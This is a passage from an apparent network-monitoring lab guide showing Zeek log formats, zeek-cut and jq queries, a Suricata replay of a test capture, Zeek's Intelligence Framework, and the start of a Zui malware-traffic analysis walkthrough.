string  count   string  count   string  bool    bool    bool    bool    count   vector[string]  vector[interval]    bool\n1726201774.886295   CXetZefExG72gUZBg   10.0.0.25   37842   8.8.8.8 53  udp 27806   0.071811    testmynids.org  1   C_INTERNET  1   A   0   NOERROR F   F   TT  0   65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117    60.000000,60.000000,60.000000,60.000000 F\n1726201774.886782   Cw9GHy49hDbEZja5N4  10.0.0.25   54819   8.8.8.8 53  udp 60281   0.105430    testmynids.org  1   C_INTERNET  28  AAAA    0   NOERROR F   F   TT  0   2600:9000:204b:f000:18:30b3:e400:93a1,2600:9000:204b:4400:18:30b3:e400:93a1,2600:9000:204b:ea00:18:30b3:e400:93a1,2600:9000:204b:a00:18:30b3:e400:93a1,2600:9000:204b:2e00:18:30b3:e400:93a1,2600:9000:204b:6000:18:30b3:e400:93a1,2600:9000:204b:7a00:18:30b3:e400:93a1,2600:9000:204b:ee00:18:30b3:e400:93a1  60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000 F\n1726201770.278903   CTJy3z1weA4svLHlMi  fe80::11bb:1eb2:4e66:8cb2   5353    ff02::fb    5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -F  F   F   F   0   -   -   F\n1726201770.279490   C7y3kf3wLnGC8eMFoj  10.0.0.20   5353    224.0.0.251 5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -   F   FF  F   0   -   -   F\n#close  2024-09-13-16-38-11\n</code></pre> <p>Next we look at Zeek\u2019s\u00a0<code>files.log</code>.</p> <pre><code>cat files.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   files\n#open   2024-09-13-16-38-11\n#fields ts  fuid    uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   source  depth   analyzers   mime_type   filename    duration    local_orig  is_orig seen_bytes  total_bytes missing_bytes   overflow_bytes  timedout    parent_fuid md5 sha1    sha256  extracted   extracted_cutoff    extracted_size\n#types  time    string  string  addr    port    addr    port    string  count   set[string] string  string  interval    bool    bool    count   count   count   count   bool    string  string  string  string  string  bool    count\n1726201775.068874   FQzmmA4txLAELVk6ug  Cf7ViS38Dir6S2Sp24  10.0.0.25   37652   65.9.141.86 80  HTTP    0   (empty) text/plain  -   0.000000    F   F   3939    0   0   F   -   -   -   -   -   -   -\n1726201775.817226   FrH7ji2KqzLDHybjXe  CFRepo2KqxbrWWYUr1  10.0.0.25   54034   65.9.141.117    80  HTTP    0   (empty) text/plain  -   0.000000    F   F   3939    0   0   F   -   -   -   -   -   -   -\n1726201776.568082   FEyCzJ3xbrSmbOSCN9  CoOFuY2lG5sn40Cx4h  10.0.0.25   51716   65.9.141.86 80  HTTP    0   (empty) text/plain  -   0.000000    F   F   3939    0   0   F   -   -   -   -   -   -   -\n#close  2024-09-13-16-38-11\n</code></pre> <p>Next we look at Zeek\u2019s\u00a0<code>http.log</code>.</p> <pre><code>cat http.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   http\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   trans_depth method  host    uri referrer    version user_agent  origin  request_body_len    response_body_len   status_code status_msg  info_code   info_msg    tags    username    password    proxied orig_fuids  orig_filenames  orig_mime_types resp_fuids  resp_filenames  resp_mime_types\n#types  time    string  addr    port    addr    port    count   string  string  string  string  string  string  string  count   count   count   string  count   string  set[enum]   string  string  set[string] vector[string]  vector[string]  vector[string]  vector[string]  vector[string]  vector[string]\n1726201775.010870   Cf7ViS38Dir6S2Sp24  10.0.0.25   37652   65.9.141.86 80  1   GET testmynids.org  /uid/index.html -   1.1 curl/7.81.0 -   0   39  200OK   -   -   (empty) -   -   -   -   -   -   FQzmmA4txLAELVk6ug  -   text/plain\n1726201775.794614   CFRepo2KqxbrWWYUr1  10.0.0.25   54034   65.9.141.117    80  1   GET testmynids.org  /uid/index.html -   1.1 curl/7.81.0 -   0   39  200OK   -   -   (empty) -   -   -   -   -   -   FrH7ji2KqzLDHybjXe  -   text/plain\n1726201776.528222   CoOFuY2lG5sn40Cx4h  10.0.0.25   51716   65.9.141.86 80  1   GET testmynids.org  /uid/index.html -   1.1 curl/7.81.0 -   0   39  200OK   -   -   (empty) -   -   -   -   -   -   FEyCzJ3xbrSmbOSCN9  -   text/plain\n#close  2024-09-13-16-38-11\n</code></pre> <p>Finally, we look at Zeek\u2019s\u00a0<code>packet_filter.log</code>. This log shows any filters that Zeek applied when processing the trace.</p> <pre><code>cat packet_filter.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   packet_filter\n#open   2024-09-13-16-38-11\n#fields ts  node    filter  init    success failure_reason\n#types  time    string  string  bool    bool    string\n1726202291.728926   zeek    ip or not ip    T   T   -\n#close  2024-09-13-16-38-11\n</code></pre> <p>As we can see with each log file, there is a set of headers beginning with the hash character (<code>#</code>) followed by metadata about the trace. This format is the standard version of Zeek data, represented as tab separated values (TSV).</p> <p>Interpreting this data as shown requires remembering which \u201ccolumn\u201d applies to which \u201cvalue.\u201d For example, in the\u00a0<code>dns.log</code>, the third field is\u00a0<code>id.orig_h</code>, so when we see data in that field, such as\u00a0<code>10.0.0.25</code>, we know that\u00a0<code>10.0.0.25</code>\u00a0is\u00a0<code>id.orig_h</code>.</p> <p>One of the common use cases for interacting with Zeek log files requires analysing specific fields. Investigators may not need to see all of the fields produced by Zeek when solving a certain problem. The following sections offer a few ways to address this concern when processing Zeek logs in text format.</p>"},{"location":"zeek/zeek.html#zeek-tsv-format-and-zeek-cut","title":"Zeek TSV Format and\u00a0zeek-cut","text":"<p>The Zeek project provides a tool called\u00a0zeek-cut\u00a0to make it easier for analysts to interact with Zeek logs in TSV format. It parses the header in each file and allows the user to refer to the specific columnar data available. This is in contrast to tools like\u00a0awk\u00a0that require the user to refer to fields referenced by their position.</p> <p>If we pass zeek-cut the fields we wish to see, the output looks like this:</p> <pre><code>cat dns.log | zeek-cut id.orig_h query answers\n</code></pre> <pre><code>10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre> <p>The sequence of field names given to zeek-cut determines the output order. This means you can also use zeek-cut to reorder fields.</p> <p>Note that in its default setup using ZeekControl (but not with a simple command-line invocation like\u00a0<code>zeek\u00a0-i\u00a0eth0</code>), watching a live interface and writing logs to disk, Zeek will rotate log files on an hourly basis. Zeek will move the current log file into a directory named using the format\u00a0<code>YYYY-MM-DD</code>. Zeek will use\u00a0gzip\u00a0to compress the file with a naming convention that includes the log file type and time range of the file.</p> <p>When processing a compressed log file, use the\u00a0zcat\u00a0tool instead of\u00a0cat\u00a0to read the file. Consider working with the gzip-encoding file created in the following example. For demonstration purposes, we create a copy of the\u00a0<code>dns.log</code>\u00a0file as\u00a0<code>dns1.log</code>,\u00a0gzip\u00a0it, and then read it with\u00a0zcat\u00a0instead of\u00a0cat.</p> <pre><code>cp dns.log dns1.log\ngzip dns1.log\nzcat dns1.log.gz\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   dns\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   proto   trans_id    rtt query   qclass  qclass_name qtype   qtype_name  rcode   rcode_name  AATC    RD  RA  Z   answers TTLs    rejected\n#types  time    string  addr    port    addr    port    enum    count   interval    string  count   string  count   string  count   string  bool    bool    bool    bool    count   vector[string]  vector[interval]    bool\n1726201774.886295   CXetZefExG72gUZBg   10.0.0.25   37842   8.8.8.8 53  udp 27806   0.071811    testmynids.org  1   C_INTERNET  1   A   0   NOERROR F   F   TT  0   65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117    60.000000,60.000000,60.000000,60.000000 F\n1726201774.886782   Cw9GHy49hDbEZja5N4  10.0.0.25   54819   8.8.8.8 53  udp 60281   0.105430    testmynids.org  1   C_INTERNET  28  AAAA    0   NOERROR F   F   TT  0   2600:9000:204b:f000:18:30b3:e400:93a1,2600:9000:204b:4400:18:30b3:e400:93a1,2600:9000:204b:ea00:18:30b3:e400:93a1,2600:9000:204b:a00:18:30b3:e400:93a1,2600:9000:204b:2e00:18:30b3:e400:93a1,2600:9000:204b:6000:18:30b3:e400:93a1,2600:9000:204b:7a00:18:30b3:e400:93a1,2600:9000:204b:ee00:18:30b3:e400:93a1  60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000 F\n1726201770.278903   CTJy3z1weA4svLHlMi  fe80::11bb:1eb2:4e66:8cb2   5353    ff02::fb    5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -F  F   F   F   0   -   -   F\n1726201770.279490   C7y3kf3wLnGC8eMFoj  10.0.0.20   5353    224.0.0.251 5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -   F   FF  F   0   -   -   F\n#close  2024-09-13-16-38-11\n</code></pre> <p>zeek-cut\u00a0accepts the flag\u00a0<code>-d</code>\u00a0to convert the epoch time values in the log files to human-readable format. For example, observe the default timestamp value:</p> <pre><code>zcat dns1.log.gz | zeek-cut ts id.orig_h query answers\n</code></pre> <pre><code>1726201774.886295   10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre> <p>Now see the effect of using the\u00a0<code>-d</code>\u00a0flag:</p> <pre><code>cat dns.log | zeek-cut -d ts id.orig_h query answers\n</code></pre> <pre><code>2024-09-13T16:29:34+1200    10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre> <p>Converting the timestamp from a log file to UTC can be accomplished with the\u00a0<code>-u</code>\u00a0option.</p> <p>The default time format when using the\u00a0<code>-d</code>\u00a0or\u00a0<code>-u</code>\u00a0is the\u00a0<code>strftime</code>\u00a0format string\u00a0<code>%Y-%m-%dT%H:%M:%S%z</code>\u00a0which results in a string with year, month, day of month, followed by hour, minutes, seconds and the timezone offset.</p> <p>The default format can be altered by using the\u00a0<code>-D</code>\u00a0and\u00a0<code>-U</code>\u00a0flags, using the standard\u00a0<code>strftime</code>\u00a0syntax. For example, to format the timestamp in the US-typical \u201cMiddle Endian\u201d you could use a format string of:\u00a0<code>%m-%d-%YT%H:%M:%S%z</code></p> <pre><code>13-09-2024T16:29:34+1200    10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre>"},{"location":"zeek/zeek.html#zeek-json-format-logs","title":"Zeek JSON Format Logs","text":"<p>During the last decade, the JavaScript Object Notation (JSON) format has become a standard way to label and store many types of data. Zeek offers support for this format. In the following example we will re-run the\u00a0<code>sample.pcap</code>\u00a0trace through Zeek, but request that it output logs in JSON format.</p> <p>First we change into the json directory to avoid overwriting our existing log files.</p> <pre><code>cd ../json/\n</code></pre> <p>Next we tell Zeek to output logs in JSON format using the command as shown.</p> <pre><code>/opt/zeek/bin/zeek -C -r ../sample.pcap LogAscii::use_json=T\n</code></pre> <p>When we look at the directory contents, we see the same five output files.</p> <pre><code>root@Suricata:/home/cyber/test_pcap/json# ls -al\ntotal 36\ndrwxr-xr-x 2 root root 4096 Sep 13 16:56 .\ndrwxr-xr-x 5 root root 4096 Sep 13 16:37 ..\n-rw-r--r-- 1 root root 3714 Sep 13 16:56 conn.log\n-rw-r--r-- 1 root root 1895 Sep 13 16:56 dns.log\n-rw-r--r-- 1 root root 1098 Sep 13 16:56 files.log\n-rw-r--r-- 1 root root 1247 Sep 13 16:56 http.log\n-rw-r--r-- 1 root root  780 Sep 13 16:56 ntp.log\n-rw-r--r-- 1 root root   90 Sep 13 16:56 packet_filter.log\n-rw-r--r-- 1 root root 3138 Sep 13 16:56 syslog.log\n</code></pre> <p>However, if we look at the file contents, the format is much different.</p> <p>First we look at\u00a0<code>packet_filter.log</code>.</p> <pre><code>cat packet_filter.log\n</code></pre> <pre><code>{\"ts\":1726203404.305186,\"node\":\"zeek\",\"filter\":\"ip or not ip\",\"init\":true,\"success\":true}\n</code></pre> <p>Next we look at\u00a0<code>dns.log</code>.</p> <pre><code>cat dns.log\n</code></pre> <pre><code>{\"ts\":1726201774.886295,\"uid\":\"CboAKi44MALjum3o2k\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37842,\"id.resp_h\":\"8.8.8.8\",\"id.resp_p\":53,\"proto\":\"udp\",\"trans_id\":27806,\"rtt\":0.07181096076965332,\"query\":\"testmynids.org\",\"qclass\":1,\"qclass_name\":\"C_INTERNET\",\"qtype\":1,\"qtype_name\":\"A\",\"rcode\":0,\"rcode_name\":\"NOERROR\",\"AA\":false,\"TC\":false,\"RD\":true,\"RA\":true,\"Z\":0,\"answers\":[\"65.9.141.86\",\"65.9.141.96\",\"65.9.141.53\",\"65.9.141.117\"],\"TTLs\":[60.0,60.0,60.0,60.0],\"rejected\":false}\n...\n</code></pre> <p>Next we look at\u00a0<code>files.log</code>.</p> <pre><code>cat files.log\n</code></pre> <pre><code>{\"ts\":1726201775.068874,\"fuid\":\"FQzmmA4txLAELVk6ug\",\"uid\":\"CQcULU2VXecTtcygwa\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37652,\"id.resp_h\":\"65.9.141.86\",\"id.resp_p\":80,\"source\":\"HTTP\",\"depth\":0,\"analyzers\":[],\"mime_type\":\"text/plain\",\"duration\":0.0,\"local_orig\":false,\"is_orig\":false,\"seen_bytes\":39,\"total_bytes\":39,\"missing_bytes\":0,\"overflow_bytes\":0,\"timedout\":false}\n...\n</code></pre> <p>Next we look at the\u00a0<code>http.log</code>.</p> <pre><code>cat http.log\n</code></pre> <pre><code>{\"ts\":1726201775.01087,\"uid\":\"CQcULU2VXecTtcygwa\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37652,\"id.resp_h\":\"65.9.141.86\",\"id.resp_p\":80,\"trans_depth\":1,\"method\":\"GET\",\"host\":\"testmynids.org\",\"uri\":\"/uid/index.html\",\"version\":\"1.1\",\"user_agent\":\"curl/7.81.0\",\"request_body_len\":0,\"response_body_len\":39,\"status_code\":200,\"status_msg\":\"OK\",\"tags\":[],\"resp_fuids\":[\"FQzmmA4txLAELVk6ug\"],\"resp_mime_types\":[\"text/plain\"]}\n...\n</code></pre> <p>Comparing the two log styles, we see strengths and weaknesses for each. For example, the TSV format shows the Zeek types associated with each entry, such as\u00a0<code>string</code>,\u00a0<code>addr</code>,\u00a0<code>port</code>, and so on. The JSON format does not include that data. However, the JSON format associates each field \u201ckey\u201d with a \u201cvalue,\u201d such as\u00a0<code>\"id.orig_p\":37652</code>. While this necessarily increases the amount of disk space used to store the raw logs, it makes it easier for analysts and software to interpret the data, as the key is directly associated with the value that follows. For this reason, most developers and analysts have adopted the JSON output format for Zeek logs. That is the format we will use for the log analysis sections of the documentation.</p>"},{"location":"zeek/zeek.html#zeek-json-format-and-jq","title":"Zeek JSON Format and\u00a0jq","text":"<p>Analysts sometimes choose to inspect JSON-formatted Zeek files using applications that recognise JSON format, such as\u00a0jq, which is a JSON parser by Stephen Dolan, available at GitHub (https://stedolan.github.io/jq/). It may already be installed on your Unix-like system.</p> <p>In the following example we process the\u00a0<code>dns.log</code>\u00a0file with the\u00a0<code>.</code>\u00a0filter, which tells\u00a0jq\u00a0to simply output what it finds in the file. By default\u00a0jq\u00a0outputs JSON formatted data in its \u201cpretty-print\u201d style, which puts one key:value pair on each line as shown.</p> <pre><code>jq . dns.log\n</code></pre> <pre><code>{\n  \"ts\": 1726201774.886295,\n  \"uid\": \"CboAKi44MALjum3o2k\",\n  \"id.orig_h\": \"10.0.0.25\",\n  \"id.orig_p\": 37842,\n  \"id.resp_h\": \"8.8.8.8\",\n  \"id.resp_p\": 53,\n  \"proto\": \"udp\",\n  \"trans_id\": 27806,\n  \"rtt\": 0.07181096076965332,\n  \"query\": \"testmynids.org\",\n  \"qclass\": 1,\n  \"qclass_name\": \"C_INTERNET\",\n  \"qtype\": 1,\n  \"qtype_name\": \"A\",\n  \"rcode\": 0,\n  \"rcode_name\": \"NOERROR\",\n  \"AA\": false,\n  \"TC\": false,\n  \"RD\": true,\n  \"RA\": true,\n  \"Z\": 0,\n  \"answers\": [\n    \"65.9.141.86\",\n    \"65.9.141.96\",\n    \"65.9.141.53\",\n    \"65.9.141.117\"\n  ],\n  \"TTLs\": [\n    60,\n    60,\n    60,\n    60\n  ],\n  \"rejected\": false\n}\n...\n</code></pre> <p>We can tell\u00a0jq\u00a0to output what it sees in \u201ccompact\u201d format using the\u00a0<code>-c</code>\u00a0switch.</p> <pre><code>jq . -c dns.log\n</code></pre> <pre><code>{\"ts\":1726201774.886295,\"uid\":\"CboAKi44MALjum3o2k\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37842,\"id.resp_h\":\"8.8.8.8\",\"id.resp_p\":53,\"proto\":\"udp\",\"trans_id\":27806,\"rtt\":0.07181096076965332,\"query\":\"testmynids.org\",\"qclass\":1,\"qclass_name\":\"C_INTERNET\",\"qtype\":1,\"qtype_name\":\"A\",\"rcode\":0,\"rcode_name\":\"NOERROR\",\"AA\":false,\"TC\":false,\"RD\":true,\"RA\":true,\"Z\":0,\"answers\":[\"65.9.141.86\",\"65.9.141.96\",\"65.9.141.53\",\"65.9.141.117\"],\"TTLs\":[60,60,60,60],\"rejected\":false}\n...\n</code></pre> <p>The power of\u00a0jq\u00a0becomes evident when we decide we only want to see specific values. For example, the following tells\u00a0jq\u00a0to look at the\u00a0<code>dns.log</code>\u00a0and report the source IP of systems doing DNS queries, followed by the query, and any answer to the query.</p> <pre><code>jq -c '[.\"id.orig_h\", .\"query\", .\"answers\"]' dns.log\n</code></pre> <pre><code>[\"192.168.4.76\",\"testmyids.com\",null]\n[\"192.168.4.76\",\"testmyids.com\",[\"31.3.245.133\"]]\n</code></pre> <p>For a more comprehensive description of the capabilities of\u00a0jq, see the\u00a0jq manual.</p> <p>With this basic understanding of how to interact with Zeek logs, we can now turn to specific logs and interpret their values.</p>"},{"location":"zeek/zeek.html#zeek-to-suricata-integration-via-pcap-files","title":"Zeek to Suricata Integration via PCAP Files","text":"<p>You can use Zeek to capture network traffic and save it as PCAP files, which can then be processed by Suricata for further signature-based analysis.</p> <p>Run the following command to capture packets from an interface and write them to a file named sample3.pcap</p> <pre><code>sudo tcpdump -i ens32 -s 0 -w sample3.pcap\n</code></pre> <p>For demonstration purposes, a curl command to <code>http://testmyids.org/uid/index.html</code> was run few times to trigger Suricata alerts. </p> <pre><code>curl http://testmyids.org/uid/index.html\n</code></pre> <p>After capturing traffic, kill the tcpdump (with\u00a0ctrl-c).</p> <p>Analyse <code>sample3.pcap</code> with Suricata:</p> <pre><code>#/home/cyber/test directory\nsudo suricata -r sample3.pcap -c /etc/suricata/suricata.yaml\n</code></pre> <p>Check summary of Suricata alerts</p> <pre><code>#/home/cyber/test directory\ncat fast.log\n</code></pre> <pre><code>09/13/2024-15:57:41.930330  [**] [1:2022973:1] ET INFO Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 0.0.0.0:68 -&gt; 255.255.255.255:67\n09/13/2024-16:12:26.419561  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:35302\n09/13/2024-16:12:28.115791  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34888\n09/13/2024-16:12:29.725875  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:35310\n09/13/2024-16:12:31.507368  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34894\n09/13/2024-16:12:32.574700  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:35312\n09/13/2024-16:22:41.951177  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:43742\n09/13/2024-16:29:35.102985  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.86:80 -&gt; 10.0.0.25:37652\n09/13/2024-16:29:35.844047  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:54034\n09/13/2024-16:29:36.590678  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.86:80 -&gt; 10.0.0.25:51716\n</code></pre>"},{"location":"zeek/zeek.html#zeeks-intelligence-framework","title":"Zeek\u2019s Intelligence Framework","text":""},{"location":"zeek/zeek.html#introduction","title":"Introduction","text":"<p>The goals of Zeek\u2019s Intelligence Framework are to consume intelligence data, make it available for matching, and provide infrastructure to improve performance and memory utilization.</p> <p>Data in the Intelligence Framework is an atomic piece of intelligence such as an IP address or an e-mail address. This atomic data will be packed with metadata such as a freeform source field, a freeform descriptive field, and a URL which might lead to more information about the specific item. The metadata in the default scripts has been deliberately kept to a minimum.</p>"},{"location":"zeek/zeek.html#quick-start","title":"Quick Start","text":"<p>Verify that there is no file named <code>intel.log</code> in the <code>/opt/zeek/logs/current/</code></p> <pre><code>ls -la /opt/zeek/logs/current\n</code></pre> <p>First we need to define the intelligence data to match. Let\u2019s look for the domain\u00a0<code>www.reddit.com</code>. For the details of the file format see the\u00a0Loading Intelligence\u00a0section below.</p> <pre><code>nano /home/cyber/intel_test/data.txt\n</code></pre> <pre><code>#fields       indicator       indicator_type  meta.source\nwww.reddit.com        Intel::DOMAIN   my_special_source\n</code></pre> <p>The file should look like this (with tabs instead of spaces):</p> <pre><code>#fields&lt;TAB&gt;indicator&lt;TAB&gt;indicator_type&lt;TAB&gt;meta.source\nwww.reddit.com&lt;TAB&gt;Intel::DOMAIN&lt;TAB&gt;my_special_source\n</code></pre> <p>Now we need to tell Zeek about the data. Add this line to your <code>opt/zeek/share/zeek/site/local.zeek</code> to load an intelligence file:</p> <pre><code>redef Intel::read_files += { \"/home/cyber/intel_test/data.txt\" };\n</code></pre> <p>Add the following line to\u00a0<code>local.zeek</code>\u00a0to load the scripts that send \u201cseen\u201d data into the Intelligence Framework to be checked against the loaded intelligence data:</p> <pre><code>@load frameworks/intel/seen\n</code></pre> <p>If you want your logs to be generated in JSON format, add the following line to <code>local.zeek</code></p> <pre><code>@load policy/tuning/json-logs.zeek\n</code></pre> <p>Save <code>local.zeek</code> and redeploy Zeek via Zeekctl</p> <pre><code>/opt/zeek/bin/zeekctl\n[ZeekControl] &gt; deploy\n</code></pre> <p>Navigate to <code>www.reddit.com</code> on a web browser or run <code>curl https://www.reddit.com</code></p> <p>Verify that <code>intel.log</code> is generated in the <code>/opt/zeek/logs/current/</code> directory.</p> <pre><code>ls -la /opt/zeek/logs/current/intel.log \n-rw-r--r-- 1 root zeek 1003 Sep 13 17:34 /opt/zeek/logs/current/intel.log\n</code></pre> <p>Intelligence data matches will be logged to the\u00a0<code>intel.log</code>\u00a0file. A match on\u00a0<code>www.reddit.com</code>\u00a0might look like this:</p> <p>TSV Format:</p> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   intel\n#open   2024-09-13-17-34-18\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   seen.indicator  seen.indicator_type seen.where  seen.node   matched sources fuid    file_mime_type  file_desc\n#types  time    string  addr    port    addr    port    string  enum    enum    string  set[enum]   set[string] string  string  string\n1726205657.998538   CqUrI04Y7fFPsytdRe  10.0.0.25   47594   8.8.8.8 53  www.reddit.com  Intel::DOMAIN   DNS::IN_REQUEST zeek    Intel::DOMAIN   my_special_source   -   -   -\n1726205657.999634   Cifoa91ikOBbh89gn6  10.0.0.25   39683   8.8.8.8 53  www.reddit.com  Intel::DOMAIN   DNS::IN_REQUEST zeek    Intel::DOMAIN   my_special_source   -   -   -\n1726205658.134483   CDfw3o3w2dyFyCK4J1  10.0.0.25   49050   151.101.65.140  80  www.reddit.com  Intel::DOMAIN   HTTP::IN_HOST_HEADER    zeek    Intel::DOMAIN   my_special_source   -   --\n1726205661.327155   Cgj6iV1JWK1QPFoE5d  10.0.0.25   51836   151.101.193.140 80  www.reddit.com  Intel::DOMAIN   HTTP::IN_HOST_HEADER    zeek    Intel::DOMAIN   my_special_source   -   --\n</code></pre> <p>JSON format:</p> <pre><code>jq . intel.log\n</code></pre> <pre><code>{\n  \"ts\": 1726206423.770539,\n  \"uid\": \"CGLHKn3xKB169eRyuc\",\n  \"id.orig_h\": \"10.0.0.25\",\n  \"id.orig_p\": 54142,\n  \"id.resp_h\": \"151.101.65.140\",\n  \"id.resp_p\": 80,\n  \"seen.indicator\": \"www.reddit.com\",\n  \"seen.indicator_type\": \"Intel::DOMAIN\",\n  \"seen.where\": \"HTTP::IN_HOST_HEADER\",\n  \"seen.node\": \"zeek\",\n  \"matched\": [\n    \"Intel::DOMAIN\"\n  ],\n  \"sources\": [\n    \"my_special_source\"\n  ]\n}\n</code></pre>"},{"location":"zeek/zeek.html#references","title":"References","text":"<ul> <li>https://youtu.be/WBid7AZ5w4A?si=YvWCA8kIJXT1jItY</li> <li>https://docs.zeek.org/en/master/index.html</li> </ul>"},{"location":"zui/zui.html","title":"Zui","text":""},{"location":"zui/zui.html#zui","title":"Zui","text":"<p>Zui is an open-source desktop application designed for efficient data exploration and analysis, particularly in network security. Zui has built-in support for both Zeek and Suricata, allowing users to import PCAP files, automatically run analyses, and explore logs generated by these tools. Additionally, Zui provides visualisation features to help users better understand complex network behaviors and security incidents.</p>"},{"location":"zui/zui.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Zui and Wireshark were installed on an Ubuntu virtual machine (VM). Malware traffic analysis was conducted using Zui and Wireshark in a safe and controlled environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) Suricata Ubuntu 22.04 LTS Zui and Wireshark 10.0.0.27 <p></p>"},{"location":"zui/zui.html#install-zui-desktop-application","title":"Install Zui Desktop Application","text":"<p>Download the installer at the\u00a0Zui download\u00a0page, as appropriate for your Linux distribution.</p> <p>Install Zui by running:</p> <pre><code>sudo dpkg -i zui_1.17.0_amd64.deb\n</code></pre> <p>Run zui by typing <code>zui</code> or clicking zui icon in the applications.</p> <p>Brimcap is a command line utility for converting\u00a0pcaps\u00a0into the flexible, searchable\u00a0Zed data formats. Brimcap is bundles with Zui Desktop Application. By default Brimcap uses both Zeek and Suricata for analysis. </p>"},{"location":"zui/zui.html#malware-traffic-analysis","title":"Malware Traffic Analysis","text":"<p>Download a sample PCAP file from https://www.malware-traffic-analysis.net/</p> <p>(e.g. https://www.malware-traffic-analysis.net/2021/06/03/index.html)</p> <p>Unzip the archive with the password <code>infectedYYYYMMDD</code></p> <p>On Zui, click <code>import data</code> and select the downloaded PCAP.</p> <p>Alternatively you can drag and drop the PCAP into Zui. </p> <p></p> <p>Once the PCAP is loaded, click <code>Query Pool</code> icon.</p> <p></p> <p>As shown below different coloured tiles are present. Different categories of Zeek events are visible in the <code>_path</code> field while the Suricata events are visible in the <code>event_type</code> field with the values <code>alerts</code> </p> <p></p> <p>By clicking on the Toggle Right Side Bar icon and Details, we can view more details on individual logs on the detail pane. Zeek generates a valued called unique identifier <code>uid</code> . <code>uid</code> is shared between the underlying connection record <code>conn.log</code> and the records that summarise the application layer transactions that occurred over that connection. By automatically joining the data by this <code>uid</code> field, Zui presents a correlation view that shows all the events with a single connection.</p> <p></p> <p></p> <p>The tiles can be clicked to jump directly to the related records in the details pane. </p> <p>The Zeek connection record also contains a community ID value that is joined with the community ID value of any Suricata alerts that were generated from the same connection. That is why the associated alerts are shown in the correlation view.</p> <p></p> <p>Zeek file records include hashes that were calculated based on the observed file payloads. When a file record is clicked, the detail pane includes tables that use these hashes to summarise whether this same file payload has appeared in the captured data, potentially under different names or transmitted from multiple hosts. </p> <p></p> <p>Filter on <code>filename!=null</code> to view file records</p> <p></p> <p>The hash value can be lookup in the VirusTotal and it confirms that this is a malicious DLL.</p> <p></p> <p></p> <p>Another handy feature in Zui is extracting individual flows. At the same time our pcap was being analysed by Zeek and Suricata, an index of its contents was also being generated. Whenever we click on a particular Zeek record, Zui uses the same correlation logic we saw earlier in the detail panel to determine the timestamp and duration of the underlying flow. When we click on the Download Packets button, packet index is used to extract just that flow from the original pcap file. This can be a great timesaver instead of opening a large pcap file on Wireshark. </p> <p></p> <p></p> <p>Right-click on one of the alerts and click <code>Filter == value</code> to focus on the alerts. By default, the Suricata software that ships with Zui applies the\u00a0Emerging Threats Open\u00a0rule set when generating alert events from imported pcap data. This rule set is updated each time Zui is launched and connected to the Internet.</p> <p></p> <p></p> <p>If you scroll across, you can see the alert for <code>BazaLoader CnC</code> and <code>Bazr Backdoor</code> have been triggered.</p> <p></p> <p>Click on each alert to examine more details. You will be able to find <code>community 